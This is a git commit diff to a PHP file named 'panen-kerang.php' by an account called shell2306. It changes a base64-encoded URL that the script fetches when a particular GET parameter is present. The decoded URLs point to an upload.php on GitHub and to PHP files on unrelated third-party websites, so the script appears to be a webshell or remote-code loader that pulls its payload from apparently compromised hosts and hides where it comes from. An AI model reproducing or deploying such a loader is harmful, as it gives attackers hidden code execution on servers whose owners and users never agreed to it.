559e4690384fcc5f85165549984d4a63746f50c3
shell2306 <nisajaniasari27@gmail.com>
2026-07-18 18:31:37 +0700

    Update panen-kerang.php

--- panen-kerang.php
+++ panen-kerang.php
@@ -23,7 +23,7 @@ function get_data($url) {
 $x = '?>';
 
 if (isset($_GET['kontol'])) {
-    $target_url = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NoZWxsMjMwNi9wZW5jYXJpa2VyYW5nL3JlZnMvaGVhZHMvbWFpbi91cGxvYWQucGhw');
+    $target_url = base64_decode('aHR0cHM6Ly9ncmVtaW9hcHUub3JnLmFyL21vZHVsZXMvbW9kX2N1c3RvbS9zcmMvRGlzcGF0Y2hlci9pbmRleC5waHA=');
 } else {
     $target_url = base64_decode('aHR0cHM6Ly9ydW1wa2UuYmx1ZXRyZWVsZWFybmluZy5jb20vYW5hbHl0aWNzL2NsYXNzZXMvcHJpdmFjeS9iYWNrdXAtcHJvdmlkZXIucGhw');
 }
